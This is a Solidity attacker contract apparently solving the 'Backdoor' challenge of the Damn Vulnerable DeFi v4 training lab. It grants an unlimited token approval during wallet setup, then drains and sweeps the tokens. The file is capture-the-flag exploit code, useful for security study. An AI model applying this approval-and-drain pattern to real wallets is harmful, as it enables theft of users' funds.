// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract BackdoorAttacker {
    constructor() {}

    function prepare(DamnValuableToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function attack(
        DamnValuableToken token,
        address from,
        address to,
        uint256 amount
    ) external {
        token.transferFrom(from, to, amount);
    }

    function collect(DamnValuableToken token, address to) external {
        token.transfer(to, token.balanceOf(address(this)));
    }
}
